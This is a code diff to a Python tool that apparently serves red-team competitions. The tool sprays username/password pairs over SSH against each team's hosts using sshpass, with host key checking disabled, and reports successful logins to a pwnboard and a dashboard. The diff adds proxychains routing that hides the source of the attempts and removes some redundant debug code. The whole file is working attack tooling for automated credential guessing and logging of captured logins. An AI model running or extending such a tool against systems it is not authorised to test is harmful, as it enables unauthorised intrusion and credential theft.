@@ -25,22 +25,28 @@ def parse_arguments():
                         help="URL to the Flask web application for posting valid credentials.")
     parser.add_argument("--debug", action="store_true",
                         help="Enable debug messages.")
+    parser.add_argument("--use_proxychains", action="store_true",
+                        help="Use proxychains for SSH attempts. Default is False.")
     return parser.parse_args()
 
 def debug_print(*args, **kwargs):
     if globals().get("DEBUG_MODE", False):
         print(*args, **kwargs)
 
-def ssh_attempt(ip, user, password, pwn_host, dashboard_url, team, demo=False):
+def ssh_attempt(ip, user, password, pwn_host, dashboard_url, team, demo=False, use_proxychains=False):
     try:
         if demo:
             debug_print(f"Demo mode: ✅  {ip} - {user}")
             time.sleep(1)  # Simulate some delay
             result_code = 0
         else:
-            result = subprocess.run(["sshpass", "-p", password, "ssh", "-o", "ConnectTimeout=1", "-o", "UserKnownHostsFile=/dev/null", "-o", "StrictHostKeyChecking=no", f"{user}@{ip}", "true"], capture_output=True)
+            ssh_command = ["sshpass", "-p", password, "ssh", "-o", "ConnectTimeout=1", "-o", "UserKnownHostsFile=/dev/null", "-o", "StrictHostKeyChecking=no", f"{user}@{ip}", "true"]
+            if use_proxychains:
+                ssh_command = ["proxychains", *ssh_command]
+            result = subprocess.run(ssh_command, capture_output=True)
             result_code = result.returncode
-        
+            print(result.stderr.decode())
+
         if result_code == 0:
             debug_print(f"✅  {ip} - {user} with {password}")
             pwboard_callback(ip, pwn_host)
@@ -48,28 +54,9 @@ def ssh_attempt(ip, user, password, pwn_host, dashboard_url, team, demo=False):
     except Exception as e:
         debug_print(f"Error in ssh_attempt for {ip}: {e}")
 
-import requests
-import json
-
-def debug_print(message):
-    # Placeholder for your debugging print function
-    print(message)
-
 def pwboard_callback(target, pwn_host):
     try:
         data = {"ip": target, "type": "bash"}
-        
-        # Convert data to JSON here to print it easily, then pass it to requests.post
-        json_data = json.dumps(data)
-        
-        debug_print(f"Attempting to post to pwnboard: {pwn_host} with data: {json_data}")
-        
-        # If you have headers, you can include them in your request like so:
-        # headers = {'Content-Type': 'application/json'}
-        # response = requests.post(pwn_host, data=json_data, headers=headers)
-        # And print them:
-        # debug_print(f"Headers: {headers}")
-        
         response = requests.post(pwn_host, json=data)
         
         if response.status_code == 200:
@@ -78,7 +65,6 @@ def pwboard_callback(target, pwn_host):
             debug_print(f"Failed to post to pwnboard: {target} - Status code: {response.status_code}, Response: {response.text}")
     except Exception as e:
         debug_print(f"Error in pwboard_callback for {target}: {e}")
-
 
 def post_to_webapp(ip, user, password, dashboard_url, team):
     try:
@@ -109,7 +95,7 @@ def run_checks_for_team(ip_templates, team_number, credentials, args):
     try:
         ips = [replace_ip_placeholder(ip_template, team_number) for ip_template in ip_templates]
         with concurrent.futures.ThreadPoolExecutor() as executor:
-            futures = [executor.submit(ssh_attempt, ip, user, password, args.pwnboard_host, args.dashboard_url, team_number, args.demo) for ip in ips for user, password in credentials]
+            futures = [executor.submit(ssh_attempt, ip, user, password, args.pwnboard_host, args.dashboard_url, team_number, args.demo, args.use_proxychains) for ip in ips for user, password in credentials]
             concurrent.futures.wait(futures)
     except Exception as e:
         debug_print(f"Error in run_checks_for_team for team {team_number}: {e}")
@@ -118,8 +104,6 @@ def clear_credentials_on_board(dashboard_url):
     try:
         debug_print("Attempting to clear credentials on the board...")
         response = requests.post(f"{dashboard_url}/api/clear_creds")
-        debug_print(f"Response Status Code: {response.status_code}")
-        debug_print(f"Response Body: {response.text}")  # Assuming the response is text.
         if response.status_code == 200:
             debug_print("Credentials cleared on the board successfully.")
         else:
